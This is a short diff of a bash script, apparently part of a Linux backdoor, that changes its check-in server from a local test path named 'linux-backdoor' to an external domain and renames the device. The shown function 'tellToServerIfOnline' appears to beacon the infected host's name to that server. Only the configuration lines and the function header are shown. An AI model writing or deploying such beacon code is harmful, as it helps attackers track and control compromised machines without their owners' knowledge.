@@ -1,7 +1,7 @@
 #!/bin/bash
 
-server="http://192.168.0.100/tyn/linux-backdoor/tellme.php"
-deviceName="test_server_with_python"
+server="http://ihatemylife.tk/tellme.php"
+deviceName="number-1"
 getParam="?device_name=$deviceName"
 
 tellToServerIfOnline() {
